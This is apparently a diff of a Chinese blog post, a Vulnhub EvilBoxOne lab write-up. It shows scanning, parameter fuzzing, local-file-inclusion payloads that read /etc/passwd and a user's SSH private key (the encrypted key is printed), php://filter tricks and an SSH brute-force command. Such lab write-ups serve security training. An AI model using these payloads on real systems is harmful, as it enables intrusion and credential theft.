@@ -119,30 +119,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&text=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&title=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&is_video=false&description=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=6 Vulnhub EvilBoxOne Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&title=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&title=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&title=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&title=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&name=6 Vulnhub EvilBoxOne Writeup&description=&lt;p&gt;该靶机难度介于简单和中等之间。不过还是能够学到很多知识。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/&t=6 Vulnhub EvilBoxOne Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.3.</span> <span class="toc-text">端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4"><span class="toc-number">2.5.</span> <span class="toc-text">参数爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.6.</span> <span class="toc-text">文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.6.1.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.6.2.</span> <span class="toc-text">伪协议写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.6.3.</span> <span class="toc-text">伪协议信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4get-shell"><span class="toc-number">2.7.</span> <span class="toc-text">边界突破（GET SHELL）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%88%86%E7%A0%B4"><span class="toc-number">2.7.1.</span> <span class="toc-text">SSH爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2ssh%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">2.7.2.</span> <span class="toc-text">SSH私钥泄露（SSH公钥登录）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.8.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%93%8D%E4%BD%9C"><span class="toc-number">2.9.</span> <span class="toc-text">验证操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
@@ -169,8 +151,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-06T16:00:00.000Z" itemprop="datePublished">2022-04-07</time>
-        
-        (Updated: <time datetime="2022-05-08T13:05:11.757Z" itemprop="dateModified">2022-05-08</time>)
         
       
     </div>
@@ -217,21 +197,15 @@
 <h1 id="渗透">渗透</h1>
 <p>攻击机kali：10.0.2.4</p>
 <h2 id="主机发现">主机发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fping -gaq <span class="token number">10.0</span>.2.0/24
-
--a: 显示可ping通的目标
--g: 生成目标列表<span class="token punctuation">(</span>不能与 -f 同时使用<span class="token punctuation">)</span>，可指定目标的开始和结束IP， 或者提供ip的子网掩码
--q: 安静模式<span class="token punctuation">(</span>不显示每个目标或每个ping的结果<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: 显示可ping通的目标</span><br><span class="line">-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码</span><br><span class="line">-q: 安静模式(不显示每个目标或每个ping的结果)</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
 <p>靶机的IP为：10.0.2.9</p>
 <h2 id="端口扫描">端口扫描</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
 <p>靶机打开了两个端口：22和80</p>
 <h2 id="端口服务发现">端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">10.0</span>.2.9
-
--A 等价于 -sV -sC -O 的组合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A 等价于 -sV -sC -O 的组合</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
 <ul>
 <li>22端口的服务为ssh，这里其实可以尝试爆破</li>
@@ -241,9 +215,9 @@
 <li>其他信息</li>
 </ul>
 <h2 id="访问http服务">访问http服务</h2>
-<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
-<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
 <p>发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用<strong>参数爆破</strong>。</p>
 <h2 id="参数爆破">参数爆破</h2>
@@ -252,17 +226,13 @@
 <li>数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；</li>
 <li>网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值</li>
 </ol>
-<p>先尝试第一种情况： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf -w <span class="token punctuation">[</span>参数字典<span class="token punctuation">]</span>:PARAM -w <span class="token punctuation">[</span>参数值字典<span class="token punctuation">]</span>:VAL -u http://10.0.2.9/secret/evil.php?PARAM<span class="token operator">=</span>VAL -fs <span class="token number">0</span>
-
--fs 过滤。 -fs <span class="token number">0</span> 表示如果页面返回的内容为空则过滤（不显示）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>发现没有任何结果。那么接下来尝试第二种情况： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ<span class="token operator">=</span><span class="token punctuation">..</span>/index.html -fs <span class="token number">0</span>
-
-如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>先尝试第一种情况： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）</span><br></pre></td></tr></table></figure></p>
+<p>发现没有任何结果。那么接下来尝试第二种情况： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替</span><br></pre></td></tr></table></figure></p>
 <p>（这里因为<code>secret</code>目录下的<code>index.html</code>内容为空，所以使用网站目录下的<code>index.html</code>）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
 <p>此时爆出一个参数名 command。我们用浏览器验证一下。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
-<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.2.9&#x2F;secret&#x2F;evil.php?command&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
 <p>（Linux中 <code>cd ..</code> 是返回上一级目录，如果<code>cd ../../../../../</code>返回五次上级目录，如果不够5次，那就返回到根目录则停止。）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
 <p>发现确实存在<strong>文件包含漏洞</strong>。</p>
@@ -274,109 +244,66 @@
 <li>如果前两者都不行，那么就利用伪协议进行信息收集；</li>
 </ol>
 <h3 id="远程文件包含">远程文件包含</h3>
-<p>先验证是否存在远程文件包含，随便在kali上写一个文件： <pre class="line-numbers language-none"><code class="language-none">hello world!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>然后开启http服务（先用浏览器访问一下是否成功开启）： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>先验证是否存在远程文件包含，随便在kali上写一个文件： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
+<p>然后开启http服务（先用浏览器访问一下是否成功开启）： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
 <p>最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。</p>
 <h3 id="伪协议写文件">伪协议写文件</h3>
 <blockquote>
 <p>php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。</p>
 </blockquote>
-<pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;test.php&amp;txt&#x3D;aGVsbG8gd29ybGQ&#x3D;
-
-hello world经过base64编码：aGVsbG8gd29ybGQ&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello world经过base64编码：aGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
 <p>访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
 <p>发现并没有写入成功，因此证明没有写文件的权限。</p>
 <h3 id="伪协议信息收集">伪协议信息收集</h3>
-<p>可以先读取<code>evil.php</code>的内容。 <pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;evil.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>将得到的结果base64解码后得到： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'command'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>可以先读取<code>evil.php</code>的内容。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
+<p>将得到的结果base64解码后得到： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>这也说明了该文件确实存在<strong>文件包含漏洞</strong>。</p>
 <h2 id="边界突破get-shell">边界突破（GET SHELL）</h2>
 <h3 id="ssh爆破">SSH爆破</h3>
-<p>从之前的信息收集发现有两个账号： <pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
-mowree:x:1000:1000:mowree,,,:&#x2F;home&#x2F;mowree:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>因此尝试对这两个账号进行密码爆破。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>从之前的信息收集发现有两个账号： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>因此尝试对这两个账号进行密码爆破。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
 <p>发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。</p>
 <h3 id="ssh私钥泄露ssh公钥登录">SSH私钥泄露（SSH公钥登录）</h3>
 <p>本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用<strong>文件包含漏洞</strong>来读取私钥。</p>
 <p><strong>第一步，先判断以下靶机是否支持SSH公钥登录</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> mowree@10.0.2.9 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
 <p>注意箭头指向的那句话，说明<code>mowree</code>存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get shell）</p>
 <p><strong>第二步，读取公钥和私钥的信息</strong></p>
 <blockquote>
 <p>如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置 公钥：<code>/home/username/.ssh/authorized_keys</code>（可以看到加密算法） 私钥：<code>/home/username/.ssh/id_rsa</code>（如果加密算法为rsa的话）</p>
 </blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">10.0</span>.2.9/secret/evil.php?command<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/home/mowree/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud&#x2F;knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV&#x2F;QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH&#x2F;XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">10.0</span>.2.9/secret/evil.php?command<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/home/mowree/.ssh/id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>查看页面源码的格式比较好看（注意格式不要改变）： <pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
-uuQm2CFIe&#x2F;eZT5pNyQ6+K1Uap&#x2F;FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
-hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST&#x2F;GKQOS4QMQMUTacjZZ8EJzoe
-o7+7tCB8Zk&#x2F;sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
-+gzWGBUmKTOLO&#x2F;gcuAZC+Tj+BoGkb2gneiMA85oJX6y&#x2F;dqq4Ir10Qom+0tOFsuot
-b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub&#x2F;k
-HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV&#x2F;ynGnOv0zhlZ+z163SjppVPK07H4bdLg
-9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ&#x2F;OnhtMKW+M948EgnY
-zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
-rRqnxYW&#x2F;fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
-tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh&#x2F;Xs
-94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr&#x2F;MdVnYWm
-VD5pEdAybKBfBG&#x2F;xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
-Mb26wNQW4ff7qe30K&#x2F;Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
-hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
-Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA&#x2F;zp+d98NnGlRqMmJK+StmqR
-IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
-MtqgW1L0iAgB4CnTIud6DpXQtR9l&#x2F;&#x2F;9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
-62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
-Q&#x2F;ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
-p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
-pwxoAe1tMmInlZfR2sKVlIeHIBfHq&#x2F;hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
-KREAJ3S0pMplP&#x2F;ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
-i99+vYdwe8+8nJq4&#x2F;WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS&#x2F;4Q6DVVxTHdp
-4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I&#x2F;
-8kOVjIjFKkGQ4rNRWKVoo&#x2F;HaRoI&#x2F;f2G6tbEiOVclUMT8iutAg8S4VA&#x3D;&#x3D;
